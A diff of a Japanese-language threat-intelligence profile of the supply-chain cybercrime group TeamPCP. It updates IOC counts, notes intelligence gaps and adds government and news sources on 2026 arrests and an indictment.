 | Credential Access | T1552.001 | Credentials In Files | SANDCLOCK資格情報スティーラーをビルド環境へ埋め込み、AWSキーとGitHubトークンを窃取する。 | malware--sandclock | activity--teampcp-oss-supply-chain-2026 | 2026-02 | 不明 | 高 | `source--gtig-ai-threat-tracker-2026-05` |
 
 ## IOC／artifact概要
 
-- IOC値: 0件
-- IOC観測: 0件
-- 複数攻撃で観測: 0件
+- IOC値: 18件
+- IOC観測: 28件
+- 複数攻撃で観測: 2件
 - 要レビュー候補: 0件
-- 非IOC artifact観測: 0件（`artifacts.csv`）
+- 非IOC artifact観測: 20件（`artifacts.csv`）
 
 ## 主要判断と不確実性
 
@@ -261,7 +289,9 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 
 ### 情報ギャップ
 
-- 個別IOCとマルウェアファミリー名の対応が一次資料で明示されていない。
+- Oligoが明示したexact IOCは構造化したが、大半は個別マルウェアファミリーとの一対一対応が示されていない。
+- CTレコードはID、対象ドメイン、issuer E6、first-seenだけが確認でき、証明書fingerprint・serial・SAN一覧は未取得である。
+- wildcardで報告された3サブドメイン族はexact hostnameが不明であり、個別IOC化には追加のCTまたはpassive DNS確認が必要である。
 - 運用者の所在国・言語圏を示す一次資料を未取得。
 - 2020年から2025年の間の個別キャンペーンを裏付ける独立資料が不足している。
 
@@ -276,7 +306,6 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 
 | Source ID | タイトル | 発行者 | 発行日 | パス | 種別 | TLP | 信頼度 |
 |---|---|---|---|---|---|---|---|
-| source--daily-48f251212f832ab9b6df | 新たなインテリジェンスがTeamPCPとShadowRay 2.0を関連付け、活動を2020年まで遡及 | oligo.security | 2026-08-08 | https://www.oligo.security/blog/new-intelligence-links-teampcp-to-shadowray-2-0-and-traces-activity-back-to-2020 | osint-report | TLP:CLEAR | 中 |
 | source--gtig-ai-threat-tracker-2026-05 | GTIG AI Threat Tracker: Adversaries Leverage AI for Vulnerability Exploitation, Augmented Operations, and Initial Access | Google Threat Intelligence Group | 2026-05-11 | https://cloud.google.com/blog/topics/threat-intelligence/ai-vulnerability-exploitation-initial-access | vendor-research-report | TLP:CLEAR | 高 |
 | source--oligo-teampcp-2026 | New Intelligence Links TeamPCP to ShadowRay 2.0 and Traces Activity Back to 2020 | Oligo Security | 2026-08-05 | https://www.oligo.security/blog/new-intelligence-links-teampcp-to-shadowray-2-0-and-traces-activity-back-to-2020 | vendor-research-report | TLP:CLEAR | 高 |
 | source--osint-microsoft-threat-actor-mapping | Microsoft Threat Actor Naming Mapping | Microsoft | 不明 | actor_profile/reference/osint/microsoft-threat-actor-mapping.json | official-vendor-actor-mapping | TLP:CLEAR | 高 |
@@ -286,6 +315,9 @@ TeamPCP(GTIG命名 UNC6780)は金銭目的のサイバー犯罪グループで�
 | source--mitre-attack-g1056 | TeamPCP, Group G1056 | MITRE ATT&CK | 2026-07-31 | https://attack.mitre.org/groups/G1056/ | structured-knowledge-base | TLP:CLEAR | 高 |
 | source--osint-misp-mitre-enterprise-intrusion-set | MISP Galaxy MITRE Enterprise ATT&CK Intrusion Set | MISP Project / MITRE ATT&CK | 不明 | actor_profile/reference/osint/misp-mitre-enterprise-attack-intrusion-set.json | structured-osint-aggregation | TLP:CLEAR | 高 |
 | source--mitre-attack-19-2 | MITRE Enterprise ATT&CK 19.2 compact local index | MITRE | 2026-08-05 | actor_profile/reference/attack-index.json | structured-knowledge-base | TLP:CLEAR | 高 |
+| source--afp-teampcp-arrests-2026 | Two WA men charged following AFP, FBI, WAPF disruption of alleged global cybercrime syndicate | Australian Federal Police | 2026-08-27 | https://www.afp.gov.au/news-centre/media-release/two-wa-men-charged-following-afp-fbi-wapf-disruption-alleged-global | government-legal-release | TLP:CLEAR | 高 |
+| source--abc-teampcp-arrests-2026 | Two WA men charged after investigation into alleged cybercrime syndicate TeamPCP | ABC News Australia | 2026-08-27 | https://www.abc.net.au/news/2026-08-27/two-wa-men-charged-after-investigation-into-alleged-cybercrime/107084796 | public-broadcaster-report | TLP:CLEAR | 高 |
+| source--doj-teampcp-thomson-indictment-2026 | Australian Man Indicted For ‘TeamPCP’ Cyberattacks On Software Supply Chain | U.S. Attorney's Office, Northern District of California | 2026-08-27 | https://www.justice.gov/usao-ndca/pr/australian-man-indicted-teampcp-cyberattacks-software-supply-chain | government-legal-release | TLP:CLEAR | 高 |
 
 ## 自由記述
 
